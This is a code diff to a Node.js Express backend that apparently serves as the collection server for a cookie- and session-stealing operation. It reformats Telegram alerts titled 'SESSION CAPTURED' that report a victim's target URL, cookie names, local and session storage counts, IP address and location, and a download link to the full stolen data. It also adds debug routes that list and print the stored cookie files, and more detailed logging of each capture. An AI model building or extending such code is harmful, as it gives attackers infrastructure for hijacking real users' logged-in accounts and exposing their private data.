@@ -84,12 +84,19 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
 
   switch(type) {
     case 'session_capture':
+      const sessionData = data.data || {};
+      const cookies = sessionData.cookies || {};
+      const localStorage = sessionData.localStorage || {};
+      const sessionStorage = sessionData.sessionStorage || {};
+      
       message = `🎯 <b>SESSION CAPTURED</b>
 
-🌐 <b>Target:</b> ${data.data?.url || 'N/A'}
-📊 <b>Cookies:</b> ${data.data?.cookies ? Object.keys(data.data.cookies).length : 0}
-💾 <b>Local Storage:</b> ${data.data?.localStorage ? Object.keys(data.data.localStorage).length : 0}
-🕒 <b>Time:</b> ${data.data?.timestamp || timestamp}
+🌐 <b>Target:</b> ${sessionData.url || 'N/A'}
+📊 <b>Cookies:</b> ${Object.keys(cookies).length}
+🍪 <b>Cookie Names:</b> ${Object.keys(cookies).join(', ') || 'None'}
+💾 <b>Local Storage:</b> ${Object.keys(localStorage).length}
+🔐 <b>Session Storage:</b> ${Object.keys(sessionStorage).length}
+🕒 <b>Time:</b> ${sessionData.timestamp || timestamp}
 
 📍 <b>Client Info:</b>
 ├ IP: <code>${ip}</code>
@@ -101,7 +108,7 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
 ├ Reference: ${metadata.reference || 'N/A'}
 └ Scope: ${metadata.scope || 'N/A'}
 
-📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
+📥 <b>Download Full Data:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
       break;
 
     case 'session_replay':
@@ -356,6 +363,79 @@ router.get('/file/:filename', async (req, res) => {
   }
 });
 
+// Debug route to see latest session data
+router.get('/debug/latest', async (req, res) => {
+  try {
+    await ensureDataDir();
+    const files = await fs.readdir(COOKIES_DIR);
+    const jsonFiles = files.filter(file => file.endsWith('.json')).sort().reverse();
+    
+    if (jsonFiles.length === 0) {
+      return res.json({ message: "No data files found" });
+    }
+    
+    const latestFile = jsonFiles[0];
+    const filepath = path.join(COOKIES_DIR, latestFile);
+    const fileContent = await fs.readFile(filepath, 'utf8');
+    const data = JSON.parse(fileContent);
+    
+    res.json({
+      filename: latestFile,
+      data: data,
+      sessionData: data.type === 'session_capture' ? {
+        cookiesCount: Object.keys(data.data?.cookies || {}).length,
+        cookieNames: Object.keys(data.data?.cookies || {}),
+        localStorageCount: Object.keys(data.data?.localStorage || {}).length,
+        sessionStorageCount: Object.keys(data.data?.sessionStorage || {}).length,
+        url: data.data?.url
+      } : null
+    });
+    
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Debug route to see all files
+router.get('/debug/files', async (req, res) => {
+  try {
+    await ensureDataDir();
+    const files = await fs.readdir(COOKIES_DIR);
+    const jsonFiles = files.filter(file => file.endsWith('.json')).sort().reverse();
+    
+    const filesWithData = await Promise.all(
+      jsonFiles.map(async (file) => {
+        try {
+          const filepath = path.join(COOKIES_DIR, file);
+          const fileContent = await fs.readFile(filepath, 'utf8');
+          const data = JSON.parse(fileContent);
+          
+          return {
+            filename: file,
+            type: data.type,
+            timestamp: data.timestamp || data.data?.timestamp,
+            cookies: data.data?.cookies ? Object.keys(data.data.cookies).length : 0,
+            url: data.url || data.data?.url
+          };
+        } catch (error) {
+          return {
+            filename: file,
+            error: error.message
+          };
+        }
+      })
+    );
+    
+    res.json({
+      totalFiles: filesWithData.length,
+      files: filesWithData
+    });
+    
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // MAIN ENDPOINT - Data collection with Telegram
 router.post('/', async (req, res) => {
   try {
@@ -415,8 +495,16 @@ router.post('/', async (req, res) => {
     console.log('   Location:', locationStr);
     console.log('   Device:', deviceType);
     console.log('   URL:', data.url || data.data?.url || 'N/A');
-    
-    if (data.cookies || data.data?.cookies) {
+
+    // DETAILED SESSION LOGGING
+    if (data.type === 'session_capture') {
+      console.log('   🍪 SESSION CAPTURE DETAILS:');
+      console.log('      Cookies:', Object.keys(data.data?.cookies || {}).length);
+      console.log('      Cookie Names:', Object.keys(data.data?.cookies || {}));
+      console.log('      Local Storage:', Object.keys(data.data?.localStorage || {}).length);
+      console.log('      Session Storage:', Object.keys(data.data?.sessionStorage || {}).length);
+      console.log('      Timestamp:', data.data?.timestamp);
+    } else if (data.cookies || data.data?.cookies) {
       const cookieCount = data.cookies ? Object.keys(data.cookies).length : 
                          data.data?.cookies ? Object.keys(data.data.cookies).length : 0;
       console.log('   Cookies:', cookieCount);
